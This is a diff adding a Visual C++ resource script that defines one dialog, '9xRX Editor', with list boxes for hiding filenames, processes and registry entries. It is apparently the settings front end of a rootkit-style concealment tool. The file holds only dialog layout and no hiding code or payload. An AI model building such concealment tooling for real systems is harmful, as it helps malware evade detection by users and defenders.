@@ -1,0 +1,114 @@
+// Microsoft Visual C++ generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "afxres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// English (U.S.) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
+#ifdef _WIN32
+LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
+#pragma code_page(1252)
+#endif //_WIN32
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE 
+BEGIN
+    "resource.h\0"
+END
+
+2 TEXTINCLUDE 
+BEGIN
+    "#include ""afxres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE 
+BEGIN
+    "\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_EDITMAIN DIALOGEX 0, 0, 135, 205
+STYLE DS_SETFONT | DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "9xRX Editor"
+FONT 8, "Verdana", 400, 0, 0x0
+BEGIN
+    DEFPUSHBUTTON   "&Apply Settings",IDOK,41,185,55,14
+    GROUPBOX        "Filename Hiding:",IDC_STATIC1,7,7,125,58
+    GROUPBOX        "Process Hiding:",IDC_STATIC2,7,66,125,57
+    GROUPBOX        "Registry Hiding:",IDC_STATIC3,6,125,125,57
+    LISTBOX         IDC_LIST1,11,18,115,25,LBS_SORT | LBS_NOINTEGRALHEIGHT | 
+                    WS_VSCROLL | WS_TABSTOP
+    LTEXT           "Filename:",IDC_STATIC,12,49,33,8
+    EDITTEXT        IDC_EDIT1,45,46,54,12,ES_AUTOHSCROLL
+    PUSHBUTTON      "&Add",IDC_BUTTON1,103,47,22,11
+    LISTBOX         IDC_LIST2,11,76,115,25,LBS_SORT | LBS_NOINTEGRALHEIGHT | 
+                    WS_VSCROLL | WS_TABSTOP
+    LTEXT           "Process:",IDC_STATIC,12,108,29,8
+    EDITTEXT        IDC_EDIT2,45,105,54,12,ES_AUTOHSCROLL
+    PUSHBUTTON      "&Add",IDC_BUTTON2,103,105,22,11
+    LISTBOX         IDC_LIST3,11,135,115,25,LBS_SORT | LBS_NOINTEGRALHEIGHT | 
+                    WS_VSCROLL | WS_TABSTOP
+    LTEXT           "Registry:",IDC_STATIC,12,167,31,8
+    EDITTEXT        IDC_EDIT3,45,164,54,12,ES_AUTOHSCROLL
+    PUSHBUTTON      "&Add",IDC_BUTTON3,103,164,22,11
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO 
+BEGIN
+    IDD_EDITMAIN, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 128
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 199
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+#endif    // English (U.S.) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
